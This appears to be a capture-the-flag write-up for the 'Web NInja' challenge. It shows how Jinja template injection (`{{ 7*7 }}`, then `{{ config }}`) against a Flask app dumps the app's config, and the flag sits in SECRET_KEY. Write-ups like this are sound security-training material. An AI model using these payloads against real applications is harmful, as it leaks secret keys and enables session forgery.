## Web NInja

Tags : `n00b19CTF`, `web`

h4ck3y3 loved Ninja hthodi in his childhood.In memory of it made this interesting challenge.Can you find the flag?

[Link](http://hack.bckdr.in:10005/)

Created by: Aniket Mathur

No. of Correct Submissions: 25


---

Seeing the source file, it seems fine, looking into request headers reveals it's a Flask application. Knowing about SSTI, it was fairly easy to test `{{ 7*7 }}`

And, it responded with `49`. Wo0t!

Payload : `{{ config }}`



Output :


Answer

```
You Entered &lt;Config {&#39;JSON_AS_ASCII&#39;: True, &#39;USE_X_SENDFILE&#39;: False, &#39;SESSION_COOKIE_SECURE&#39;: False, &#39;SESSION_COOKIE_PATH&#39;: None, &#39;SESSION_COOKIE_DOMAIN&#39;: False, &#39;SESSION_COOKIE_NAME&#39;: &#39;session&#39;, &#39;MAX_COOKIE_SIZE&#39;: 4093, &#39;SESSION_COOKIE_SAMESITE&#39;: None, &#39;PROPAGATE_EXCEPTIONS&#39;: None, &#39;ENV&#39;: &#39;production&#39;, &#39;DEBUG&#39;: False, &#39;SECRET_KEY&#39;: &#39;CTF{N00b_kn0w5_50m3_fl45ky_57uff}&#39;, &#39;EXPLAIN_TEMPLATE_LOADING&#39;: False, &#39;MAX_CONTENT_LENGTH&#39;: None, &#39;APPLICATION_ROOT&#39;: &#39;/&#39;, &#39;SERVER_NAME&#39;: None, &#39;PREFERRED_URL_SCHEME&#39;: &#39;http&#39;, &#39;JSONIFY_PRETTYPRINT_REGULAR&#39;: False, &#39;TESTING&#39;: False, &#39;PERMANENT_SESSION_LIFETIME&#39;: datetime.timedelta(31), &#39;TEMPLATES_AUTO_RELOAD&#39;: None, &#39;TRAP_BAD_REQUEST_ERRORS&#39;: None, &#39;JSON_SORT_KEYS&#39;: True, &#39;JSONIFY_MIMETYPE&#39;: &#39;application/json&#39;, &#39;SESSION_COOKIE_HTTPONLY&#39;: True, &#39;SEND_FILE_MAX_AGE_DEFAULT&#39;: datetime.timedelta(0, 43200), &#39;PRESERVE_CONTEXT_ON_EXCEPTION&#39;: None, &#39;SESSION_REFRESH_EACH_REQUEST&#39;: True, &#39;TRAP_HTTP_EXCEPTIONS&#39;: False}&gt;
```

--> CTF{N00b_kn0w5_50m3_fl45ky_57uff}